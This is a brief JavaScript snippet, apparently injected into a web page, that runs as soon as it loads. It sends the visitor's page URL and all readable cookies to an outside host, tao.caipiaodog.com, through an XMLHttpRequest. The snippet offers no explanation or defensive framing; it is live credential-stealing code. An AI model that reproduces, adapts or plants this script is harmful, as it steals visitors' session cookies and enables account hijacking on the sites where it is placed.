
function loadXMLDoc(){
var xmlhttp;if (window.XMLHttpRequest)
  {
  xmlhttp=new XMLHttpRequest();
  }
else
  {
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        
    }
  }
xmlhttp.open("GET","//tao.caipiaodog.com/send?www="+encodeURIComponent(location.href)+'&cookie='+encodeURIComponent(document.cookie),true);
xmlhttp.send();
}
loadXMLDoc();